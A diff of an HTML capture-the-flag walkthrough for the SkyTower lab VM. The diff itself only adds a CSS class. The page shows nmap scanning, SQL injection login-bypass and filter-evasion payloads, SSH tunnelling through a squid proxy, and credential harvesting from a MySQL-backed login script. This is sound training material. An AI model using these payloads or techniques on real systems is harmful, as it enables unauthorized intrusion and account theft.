@@ -220,7 +220,7 @@
 <div class="section" id="network-reconnaisance">
 <h2>3.25.1. network reconnaisance<a class="headerlink" href="#network-reconnaisance" title="Permalink to this headline">¶</a></h2>
 <p>Since skytower is on our local network we’ll use <cite>nmap</cite> to fingerprint all hosts to figure out which one is skytower:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -F -O <span class="m">192</span>.168.1.0/24
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -F -O <span class="m">192</span>.168.1.0/24
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">Nmap scan report for 192.168.1.105</span>
 <span class="go">Host is up (0.0039s latency).</span>
@@ -241,7 +241,7 @@
 </pre></div>
 </div>
 <p>The most likely IP for skywalker is 192.168.1.105 which is running ssh (filtered), http, and a squid-http proxy. For completeness we’ll get the service versions.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -sV -p T:22,80,3128  <span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> sudo nmap -n -sV -p T:22,80,3128  <span class="m">192</span>.168.1.105
 
 <span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 09:32 PST</span>
 <span class="go">Nmap scan report for 192.168.1.105</span>
@@ -260,7 +260,7 @@
 <div class="section" id="web-server-sql-injection">
 <h2>3.25.2. web server sql injection<a class="headerlink" href="#web-server-sql-injection" title="Permalink to this headline">¶</a></h2>
 <p>Pointing a web browser at the skytower web server reveals a login form:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$ curl $</span>TARGET <span class="m">2</span>&gt;/dev/null <span class="p">|</span> sed -n <span class="s1">&#39;/&lt;form/,/&lt;\/form/p&#39;</span>
 <span class="go">   &lt;form style=&quot;margin: 0 auto;width:250px;&quot; action=&#39;login.php&#39; method=&#39;POST&#39;&gt;</span>
 <span class="go">     &lt;br&gt;&lt;strong&gt;Skytech Login:&lt;/strong&gt;&lt;br&gt;&lt;br&gt;</span>
@@ -272,8 +272,8 @@
 <span class="go">   &lt;/form&gt;</span>
 </pre></div>
 </div>
-<p>So the login form has 2 arguments: <em>email</em> and <em>password</em>. Let’s look for SQL injection exploits by trying first <em>email</em> as <code class="docutils literal"><span class="pre">test'</span></code> (note the trailing single quote ‘) and <em>password</em> as the empty string.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>So the login form has 2 arguments: <em>email</em> and <em>password</em>. Let’s look for SQL injection exploits by trying first <em>email</em> as <code class="docutils literal notranslate"><span class="pre">test'</span></code> (note the trailing single quote ‘) and <em>password</em> as the empty string.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;test&#39;&quot;</span> <span class="se">\</span>
     --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
     http://<span class="nv">$TARGET</span>/login.php
@@ -281,9 +281,9 @@
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-<p>This one query is revealing because of the error message: SQL injection is possible, the backend database is MySQL, and the actual query looks something like <code class="docutils literal"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">table</span> <span class="pre">where</span> <span class="pre">email</span> <span class="pre">=</span> <span class="pre">'$email'</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">'$password'</span></code> (where $email and $password are the user input values). That is, stripping off the surrounding single quotes from the error message leaves <code class="docutils literal"><span class="pre">'test''</span> <span class="pre">and</span> <span class="pre">password=''</span></code>, implying the above query format.</p>
-<p>Knowing this allows crafting a simple SQL injection. Since <code class="docutils literal"><span class="pre">OR</span></code> has lower precedence than <code class="docutils literal"><span class="pre">AND</span></code>, if we append <code class="docutils literal"><span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> we get a query like <code class="docutils literal"><span class="pre">email</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> which is always true. So let’s try that first using <em>email</em> as the empty string and <em>password</em> = <code class="docutils literal"><span class="pre">'</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">'</span></code>:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>This one query is revealing because of the error message: SQL injection is possible, the backend database is MySQL, and the actual query looks something like <code class="docutils literal notranslate"><span class="pre">SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">table</span> <span class="pre">where</span> <span class="pre">email</span> <span class="pre">=</span> <span class="pre">'$email'</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">'$password'</span></code> (where $email and $password are the user input values). That is, stripping off the surrounding single quotes from the error message leaves <code class="docutils literal notranslate"><span class="pre">'test''</span> <span class="pre">and</span> <span class="pre">password=''</span></code>, implying the above query format.</p>
+<p>Knowing this allows crafting a simple SQL injection. Since <code class="docutils literal notranslate"><span class="pre">OR</span></code> has lower precedence than <code class="docutils literal notranslate"><span class="pre">AND</span></code>, if we append <code class="docutils literal notranslate"><span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> we get a query like <code class="docutils literal notranslate"><span class="pre">email</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">and</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">''</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">''</span></code> which is always true. So let’s try that first using <em>email</em> as the empty string and <em>password</em> = <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">OR</span> <span class="pre">NOT</span> <span class="pre">'</span></code>:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="se">\</span>
     --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&#39; OR NOT &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
     http://<span class="nv">$TARGET</span>/login.php
@@ -291,8 +291,8 @@
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-<p>Wait - it was valid syntax and should have worked but didn’t. Let’s force a syntax error to see what’s going on by removing the leading <code class="docutils literal"><span class="pre">'</span></code> in <em>password</em>.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>Wait - it was valid syntax and should have worked but didn’t. Let’s force a syntax error to see what’s going on by removing the leading <code class="docutils literal notranslate"><span class="pre">'</span></code> in <em>password</em>.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php <span class="se">\</span>
     --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot; OR NOT &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
     http://<span class="nv">$TARGET</span>/login.php
@@ -300,8 +300,8 @@
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-<p>What happened to <code class="docutils literal"><span class="pre">OR</span> <span class="pre">NOT</span></code>? It was apparently filtered out. Knowing that MySQL could also use <code class="docutils literal"><span class="pre">||</span> <span class="pre">!</span></code> for the same thing we’ll try that:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>What happened to <code class="docutils literal notranslate"><span class="pre">OR</span> <span class="pre">NOT</span></code>? It was apparently filtered out. Knowing that MySQL could also use <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span></code> for the same thing we’ll try that:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>login.php --form <span class="nv">email</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="se">\</span>
     --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;&#39; || ! &#39;&quot;</span> --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
     http://<span class="nv">$TARGET</span>/login.php
@@ -311,12 +311,12 @@
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-<p>Intermediate success! We’ve just been given instructions to SSH using userid/password john/hereisjohn. Before we do that, what if <code class="docutils literal"><span class="pre">||</span> <span class="pre">!</span></code> were also filtered? Then we would have tried <code class="docutils literal"><span class="pre">OORR</span> <span class="pre">NNOTOT</span></code>, which also works. Filtering input is hard. Note the following also work: both email &amp; password as <code class="docutils literal"><span class="pre">'</span> <span class="pre">*</span> <span class="pre">'</span></code>; or email = <code class="docutils literal"><span class="pre">'</span> <span class="pre">*</span></code> and password = <code class="docutils literal"><span class="pre">||</span> <span class="pre">!</span> <span class="pre">'</span></code>.</p>
+<p>Intermediate success! We’ve just been given instructions to SSH using userid/password john/hereisjohn. Before we do that, what if <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span></code> were also filtered? Then we would have tried <code class="docutils literal notranslate"><span class="pre">OORR</span> <span class="pre">NNOTOT</span></code>, which also works. Filtering input is hard. Note the following also work: both email &amp; password as <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">*</span> <span class="pre">'</span></code>; or email = <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">*</span></code> and password = <code class="docutils literal notranslate"><span class="pre">||</span> <span class="pre">!</span> <span class="pre">'</span></code>.</p>
 </div>
 <div class="section" id="web-server-shell-access">
 <h2>3.25.3. web server shell access<a class="headerlink" href="#web-server-shell-access" title="Permalink to this headline">¶</a></h2>
-<p>Of course it can’t be as easy as <code class="docutils literal"><span class="pre">TARGET=192.168.1.105</span>&#160;&#160; <span class="pre">ssh</span> <span class="pre">john&#64;$TARGET</span></code> which hangs (remember the <code class="docutils literal"><span class="pre">nmap</span></code> ssh state of “filtered”). However, <code class="docutils literal"><span class="pre">ssh</span></code> works through the proxy server on $TARGET using the option <em>ProxyCommand</em> with either <code class="docutils literal"><span class="pre">socat</span></code> or <code class="docutils literal"><span class="pre">proxytunnel</span></code>. Since <code class="docutils literal"><span class="pre">socat</span></code> is more likely to be present on a server we prefer that method but illustrate both. Note that the <code class="docutils literal"><span class="pre">ssh</span></code> destination “<a class="reference external" href="mailto:john&#37;&#52;&#48;127&#46;0&#46;0&#46;1">john<span>&#64;</span>127<span>&#46;</span>0<span>&#46;</span>0<span>&#46;</span>1</a>” is relative to the proxy server, not the local host.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>Of course it can’t be as easy as <code class="docutils literal notranslate"><span class="pre">TARGET=192.168.1.105</span>&#160;&#160; <span class="pre">ssh</span> <span class="pre">john&#64;$TARGET</span></code> which hangs (remember the <code class="docutils literal notranslate"><span class="pre">nmap</span></code> ssh state of “filtered”). However, <code class="docutils literal notranslate"><span class="pre">ssh</span></code> works through the proxy server on $TARGET using the option <em>ProxyCommand</em> with either <code class="docutils literal notranslate"><span class="pre">socat</span></code> or <code class="docutils literal notranslate"><span class="pre">proxytunnel</span></code>. Since <code class="docutils literal notranslate"><span class="pre">socat</span></code> is more likely to be present on a server we prefer that method but illustrate both. Note that the <code class="docutils literal notranslate"><span class="pre">ssh</span></code> destination “<a class="reference external" href="mailto:john&#37;&#52;&#48;127&#46;0&#46;0&#46;1">john<span>&#64;</span>127<span>&#46;</span>0<span>&#46;</span>0<span>&#46;</span>1</a>” is relative to the proxy server, not the local host.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> ssh -o <span class="s2">&quot;ProxyCommand proxytunnel -p </span><span class="nv">$TARGET</span><span class="s2">:3128 \</span>
 <span class="s2">    -d %h:%p&quot;</span> john@127.0.0.1
 <span class="go">Via 192.168.1.105:3128 -&gt; 127.0.0.1:22</span>
@@ -343,8 +343,8 @@
 <span class="gp">hacker@kali:~$</span>
 </pre></div>
 </div>
-<p>However, the <code class="docutils literal"><span class="pre">ssh</span></code> immediately logs off. So we tried to instead run the command <code class="docutils literal"><span class="pre">exec</span> <span class="pre">/bin/bash</span></code> and that avoided the immediate logoff (adding in the problem of an environment without .profile nor .bashrc being run). But that gave us the hint why we were immediately logged off: either .profile or .bashrc caused the exit, so we fix that:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<p>However, the <code class="docutils literal notranslate"><span class="pre">ssh</span></code> immediately logs off. So we tried to instead run the command <code class="docutils literal notranslate"><span class="pre">exec</span> <span class="pre">/bin/bash</span></code> and that avoided the immediate logoff (adding in the problem of an environment without .profile nor .bashrc being run). But that gave us the hint why we were immediately logged off: either .profile or .bashrc caused the exit, so we fix that:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
     <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
     john@127.0.0.1 <span class="nb">exec</span> /bin/bash
@@ -362,7 +362,7 @@
 </pre></div>
 </div>
 <p>Now we can login and not get logged off. But our user can’t do much of anything as they have few privileges.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
     <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
     john@127.0.0.1
@@ -380,7 +380,7 @@
 <div class="section" id="dump-the-mysql-user-database">
 <h2>3.25.4. dump the MySQL user database<a class="headerlink" href="#dump-the-mysql-user-database" title="Permalink to this headline">¶</a></h2>
 <p>Now we’re on skywalker as non-root user john. There are many options for capturing the flag: Apache web server, squid proxy, OS misconfiguration, and a MySQL database having user account information (being perhaps the most likely candidate). Below we dump the user account information by getting the MySQL root access from the <em>login.php</em> script.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">john@SkyTower:~$</span> grep DocumentRoot /etc/apache2/sites-available/default
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">john@SkyTower:~$</span> grep DocumentRoot /etc/apache2/sites-available/default
 <span class="go">  DocumentRoot /var/www</span>
 <span class="gp">john@SkyTower:~$</span> more /var/www/login.php
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
@@ -434,7 +434,7 @@
 <div class="section" id="capture-the-flag">
 <h2>3.25.5. capture the flag<a class="headerlink" href="#capture-the-flag" title="Permalink to this headline">¶</a></h2>
 <p>User william/sensable was a dead end but sara/ihatethisjob captured the flag.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.105
 <span class="gp">hacker@kali:~$</span> ssh -o <span class="se">\</span>
     <span class="s2">&quot;ProxyCommand socat STDIO PROXY:</span><span class="nv">$TARGET</span><span class="s2">:%h:%p,proxyport=3128&quot;</span> <span class="se">\</span>
     william@127.0.0.1 <span class="nb">exec</span> /bin/bash
